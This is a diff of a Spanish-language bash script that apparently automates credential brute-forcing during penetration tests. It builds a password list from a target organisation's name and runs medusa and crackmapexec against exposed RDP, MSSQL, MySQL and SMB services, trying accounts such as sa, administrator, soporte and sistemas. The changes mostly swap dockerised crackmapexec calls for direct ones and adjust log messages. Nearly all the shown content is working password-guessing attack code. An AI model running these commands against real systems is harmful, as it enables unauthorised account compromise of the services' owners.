@@ -101,11 +101,12 @@ if [ $DICTIONARY = NULL ] ; then
 		echo "Generando diccionario"
 		echo $ENTIDAD > base.txt
 		passGen.sh -f base.txt -t online -o online.txt
-		cat online.txt $PASSWORDS_FILE | sort | uniq >  passwords.txt			
+		cat online.txt $PASSWORDS_FILE | sort | uniq >  passwords.txt		
 	else
 		echo "PASSWORDS_FILE $PASSWORDS_FILE"
 	   cp $PASSWORDS_FILE passwords.txt
 	fi
+	echo "Done Generando"
 	# echo "wordpress" >> passwords.txt	
 	# echo "joomla" >> passwords.txt	
 	# echo "drupal" >> passwords.txt
@@ -123,11 +124,14 @@ function insert_data () {
 
 find  servicios -size  0 -print0 |xargs -0 rm 2>/dev/null 
 
+echo "Revisar servicios "
+
 if [ -f servicios/rdp.txt ]; then	
+	echo -e "$OKBLUE\n\t#################### RDP ######################$RESET"	    
 	for line in $(cat servicios/rdp.txt); do
 		ip=`echo $line | cut -f1 -d":"`
 		port=`echo $line | cut -f2 -d":"`
-		echo -e "\n\t $OKBLUE Encontre servicios de RDP expuestos en $ip:$port $RESET"	  
+		echo -e "[+] Probando $ip:$port"
 		
 		####### user administrador/administrator ####
 		echo "admin_user $admin_user"
@@ -154,7 +158,7 @@ then
 		ip=`echo $line | cut -f1 -d":"`
 		port=`echo $line | cut -f2 -d":"`
 		
-		echo -e "[+] Probando $ip"						
+		echo -e "[+] Probando $ip:$port"
 		echo "medusa -e n -u sa -P passwords.txt -h $ip -M mssql -f -t 1 "  >> logs/cracking/"$ip"_1433_passwordBD.txt
 		medusa -e n -u sa -P passwords.txt -h $ip -M mssql -f -t 1  >> logs/cracking/"$ip"_1433_passwordBD.txt 2>/dev/null &
 		
@@ -202,7 +206,7 @@ fi
 
 if [ -f servicios/mysql.txt ]
 then       	
-	echo -e "$OKBLUE\n\t#################### Testing common pass MYSQL (lennnto) ######################$RESET"	
+	echo -e "$OKBLUE\n\t#################### Testing common pass MYSQL ######################$RESET"	
 	sed -i '1 i\mysql' passwords.txt	#adicionar password mysql
 	for line in $(cat servicios/mysql.txt); do
 		ip=`echo $line | cut -f1 -d":"`
@@ -251,21 +255,21 @@ fi
 			ip=`echo $line | cut -f1 -d":"`
 			port=`echo $line | cut -f2 -d":"`
 
-			echo  "\n docker run -v `pwd`:/home -it byt3bl33d3r/crackmapexec smb $ip -u $admin_user -p /home/passwords.txt" >> logs/cracking/"$ip"_windows_passwordAdivinadoWin.txt 2>/dev/null
-			docker run -v `pwd`:/home -it byt3bl33d3r/crackmapexec smb $ip -u $admin_user -p /home/passwords.txt | sed -r 's/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g' >> logs/cracking/"$ip"_windows_passwordAdivinadoWin.txt 2>/dev/null
+			echo  "\n crackmapexec smb $ip -u $admin_user -p passwords.txt" >> logs/cracking/"$ip"_windows_passwordAdivinadoWin.txt 2>/dev/null
+			crackmapexec smb $ip -u $admin_user -p passwords.txt | sed -r 's/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g' >> logs/cracking/"$ip"_windows_passwordAdivinadoWin.txt 2>/dev/null
 
 			if [[ "$MODE" == "vulnerabilidades" || "$MODE" == "completo" ]]; then 
 
 				if [ "$LENGUAJE" == "es" ]; then
-					echo -e "docker run -v `pwd`:/home -it byt3bl33d3r/crackmapexec smb $ip -u soporte -p /home/passwords.txt --local-auth" >>  logs/cracking/"$ip"_windows_passwordAdivinadoWin.txt 2>/dev/null
-					docker run -v `pwd`:/home -it byt3bl33d3r/crackmapexec smb $ip -u soporte -p /home/passwords.txt --local-auth | sed -r 's/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g' >>  logs/cracking/"$ip"_windows_passwordAdivinadoWin.txt 2>/dev/null
+					echo -e "crackmapexec smb $ip -u soporte -p passwords.txt --local-auth" >>  logs/cracking/"$ip"_windows_passwordAdivinadoWin.txt 2>/dev/null
+					crackmapexec smb $ip -u soporte -p passwords.txt --local-auth | sed -r 's/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g' >>  logs/cracking/"$ip"_windows_passwordAdivinadoWin.txt 2>/dev/null
 					
-					echo -e "\n docker run -v `pwd`:/home -it byt3bl33d3r/crackmapexec smb $ip -u sistemas -p /home/passwords.txt --local-auth" >>  logs/cracking/"$ip"_windows_passwordAdivinadoWin.txt 2>/dev/null
-					docker run -v `pwd`:/home -it byt3bl33d3r/crackmapexec smb $ip -u sistemas -p /home/passwords.txt --local-auth | sed -r 's/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g' >>  logs/cracking/"$ip"_windows_passwordAdivinadoWin.txt 2>/dev/null
+					echo -e "\n crackmapexec smb $ip -u sistemas -p passwords.txt --local-auth" >>  logs/cracking/"$ip"_windows_passwordAdivinadoWin.txt 2>/dev/null
+					crackmapexec smb $ip -u sistemas -p passwords.txt --local-auth | sed -r 's/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g' >>  logs/cracking/"$ip"_windows_passwordAdivinadoWin.txt 2>/dev/null
 				fi
 					
-				echo -e "\n docker run -v `pwd`:/home -it byt3bl33d3r/crackmapexec smb $ip -u $ENTIDAD -p /home/passwords.txt --local-auth" >>  logs/cracking/"$ip"_windows_passwordAdivinadoWin.txt 2>/dev/null
-				docker run -v `pwd`:/home -it byt3bl33d3r/crackmapexec smb $ip -u $ENTIDAD -p /home/passwords.txt --local-auth | sed -r 's/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g' >>  logs/cracking/"$ip"_windows_passwordAdivinadoWin.txt 2>/dev/null	&
+				echo -e "\n crackmapexec smb $ip -u $ENTIDAD -p passwords.txt --local-auth" >>  logs/cracking/"$ip"_windows_passwordAdivinadoWin.txt 2>/dev/null
+				crackmapexec smb $ip -u $ENTIDAD -p passwords.txt --local-auth | sed -r 's/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g' >>  logs/cracking/"$ip"_windows_passwordAdivinadoWin.txt 2>/dev/null	&
 			fi
 		done	
 	fi
@@ -854,10 +858,10 @@ fi #modo completo/vulnerabilidades
 
 ######## wait to finish########
 while true; do
-	scan_instancias=$((`ps aux | egrep 'medusa|docker|passWeb|patator.py' | egrep -v 'dockerd|color|keyring|docker-proxy|vscode-server|responder' | wc -l` - 1)) 
+	scan_instancias=$((`ps aux | egrep 'medusa|passWeb|patator.py|crackmapexec' | egrep -v 'color|keyring|vscode-server|responder' | wc -l` - 1)) 
 	if [ "$scan_instancias" -gt 0 ]
 	then
-		echo -e "\t[i] Todavia hay escaneos de medusa/docker/passWeb activos ($scan_instancias)"  
+		echo -e "\t[i] Todavia hay escaneos de medusa/passWeb activos ($scan_instancias)"  
 		sleep 30
 	else
 		break		  		 
